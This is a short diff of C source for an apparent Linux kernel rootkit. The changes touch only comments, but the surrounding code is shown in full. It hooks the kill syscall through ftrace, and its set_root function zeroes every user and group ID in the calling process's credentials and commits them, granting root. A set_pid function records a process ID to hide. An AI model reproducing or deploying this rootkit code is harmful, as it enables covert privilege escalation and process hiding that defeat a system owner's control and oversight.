@@ -77,20 +77,20 @@ asmlinkage int hook_kill(const struct pt_regs *regs)
 
 void set_root(void)
 {
-    /* prepare_creds returns the current credentials of the process */
+    // prepare_creds returns the current credentials of the process 
     struct cred *root;
     root = prepare_creds();
 
     if (root == NULL)
         return;
 
-    /* Run through and set all the various *id's to 0 (root) */
+    // set all the various *id's to 0 (root) */
     root->uid.val = root->gid.val = 0;
     root->euid.val = root->egid.val = 0;
     root->suid.val = root->sgid.val = 0;
     root->fsuid.val = root->fsgid.val = 0;
 
-    /* Set the cred struct that we've modified to that of the calling process */
+    // commit changes, setting the process as a root process
     commit_creds(root);
 }
 
@@ -110,7 +110,7 @@ void set_pid(pid_t pid)
     sprintf(hide_pid, "%d", pid);
 }
 
-/* Declare the struct that ftrace needs to hook the syscall */
+// export hook
 struct ftrace_hook kill_hooks[] = {
     HOOK("__x64_sys_kill", hook_kill, &orig_kill),
 };
